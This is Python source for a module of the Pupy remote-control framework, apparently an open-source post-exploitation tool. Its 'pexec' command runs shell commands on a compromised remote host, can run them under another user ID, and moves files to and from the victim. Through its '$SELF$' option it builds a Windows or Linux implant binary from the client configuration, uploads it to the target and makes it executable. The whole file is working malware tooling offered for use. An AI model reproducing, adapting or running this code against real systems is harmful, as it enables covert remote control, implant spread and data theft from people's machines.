# -*- coding: utf-8 -*-

import subprocess

from pupylib.PupyModule import *

import subprocess
import time
import datetime
import os
import re
import stat
import pupygen
import tempfile
import threading

from rpyc.utils.classic import upload

__class_name__="PExec"

@config(cat="admin")
class PExec(PupyModule):
    """ Execute shell commands non-interactively on a remote system in background using popen"""

    terminate_pipe = None
    terminated = False

    updl = re.compile('\^([^\^]+)\^([<>])([^\^]+)\^')
    # daemon = True

    dependencies = [ "pupyutils.safepopen" ]
    io = REQUIRE_STREAM

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='pexec', description=cls.__doc__)
        cls.arg_parser.add_argument(
            '-n',
            action='store_true',
            help='Don\'t catch stderr',
        )
        cls.arg_parser.add_argument(
            '-N',
            action='store_true',
            help='Don\'t receive stdout (read still be done on the other side)',
        )
        cls.arg_parser.add_argument(
            '-s',
            action='store_true',
            help='Start in shell',
        )
        cls.arg_parser.add_argument(
            '-S', '--set-uid',
            help='Set UID (Posix only)',
        )
        cls.arg_parser.add_argument(
            'arguments',
            nargs=argparse.REMAINDER,
            help='CMD args. You can use ^/local/path^[>|<]/remote/path^ '
            'form to upload|download files before|after command'
        )

    def run(self, args):
        if not args.arguments:
            self.error('No command specified {}'.format(args.__dict__))
            return

        cmdargs = args.arguments

        to_upload = []
        to_download = []
        to_delete = []

        rexpandvars = self.client.remote('os.path', 'expandvars')
        rexists = self.client.remote('os.path', 'exists')
        rchmod = self.client.remote('os', 'chmod')
        safe_exec = self.client.remote('pupyutils.safepopen', 'safe_exec', False)

        for i, arg in enumerate(cmdargs):
            for local, direction, remote in self.updl.findall(arg):
                if local == '$SELF$':
                    platform = self.client.platform
                    if not platform in ('windows', 'linux'):
                        self.error('Couldn\'t use $SELF$ on platform {}'.format(platform))
                    xlocal = '$SELF$'
                else:
                    xlocal = os.path.expandvars(local)

                xremote = rexpandvars(remote)

                if direction == '<':
                    to_download.append((xremote, xlocal))
                else:
                    if xlocal == '$SELF$':
                        mode = 0711
                        to_upload.append((xlocal, xremote, mode))
                    else:
                        if not os.path.exists(xlocal):
                            self.error('No local file {} found (scheduled for upload)'.format(
                                xlocal))

                        mode = os.stat(xlocal).st_mode
                        to_upload.append((xlocal, xremote, mode))

                arg = arg.replace('^'+local+'^'+direction+remote+'^', remote)

            cmdargs[i] = arg

        for local, remote, mode in to_upload:
            if local == '$SELF$':
                platform = self.client.platform
                arch = ''
                config = self.client.get_conf()

                payload = b''
                if self.client.is_proc_arch_64_bits():
                    if platform == 'windows':
                        payload = pupygen.get_edit_pupyx64_exe(config)
                    else:
                        payload = pupygen.get_edit_pupyx64_lin(config)

                    arch = 'x64'
                else:
                    if platform == 'windows':
                        payload = pupygen.get_edit_pupyx86_exe(config)
                    else:
                        payload = pupygen.get_edit_pupyx86_lin(config)

                    arch = 'x86'

                with tempfile.NamedTemporaryFile() as tmp:
                    self.info('Store pupy/{}/{}/size={} to {}'.format(
                        platform, arch, len(payload), tmp.name))
                    tmp.write(payload)
                    tmp.flush()
                    self.info('Upload {} -> {}'.format(tmp.name, remote))
                    upload(self.client.conn, tmp.name, remote)
            else:
                self.info('Upload {} -> {}'.format(local, remote))
                upload(self.client.conn, local, remote)

            rchmod(remote, mode)

        cmdenv = {
            'stderr': (None if args.n else subprocess.STDOUT),
            'universal_newlines': False,
        }

        if len(cmdargs) == 1 and ' ' in cmdargs[0]:
            cmdenv.update({
                'shell': True
            })
            cmdargs = cmdargs[0]
        else:
            cmdenv.update({
                'shell': False
            })
            if args.s:
                cmdargs = [
                    'cmd.exe', '/c',
                ] + cmdargs if self.client.is_windows() else [
                    '/bin/sh', '-c', ' '.join(
                        '"'+x.replace('"','\"')+'"' for x in cmdargs
                    )
                ]

        if args.set_uid:
            cmdenv.update({
                'suid': args.set_uid
            })

        close_event = threading.Event()

        def on_read(data):
            self.stdout.write(data)

        self.terminate_pipe, get_returncode = safe_exec(
            None if args.N else on_read,
            close_event.set,
            tuple(cmdargs), **cmdenv)

        if hasattr(self.job, 'id'):
            self.success('Started at {}): '.format(
                datetime.datetime.now()))

        close_event.wait()

        retcode = get_returncode()

        if retcode == 0:
            self.success('Successful at {}: '.format(datetime.datetime.now()))
        else:
            self.error(
                'Ret: {} at {}'.format(retcode, datetime.datetime.now()))

        for remote, local in to_download:
            if rexists(remote):
                self.info('Download {} -> {}'.format(remote, local))
                download(self.client.conn, remote, local)
            else:
                self.error('Remote file {} not exists (scheduled for download)'.format(remote))

    def interrupt(self):
        if not self.terminated and self.terminate_pipe:
            self.terminated = True
            self.error('Stopping command')
            self.terminate_pipe()
            self.error('Stopped')
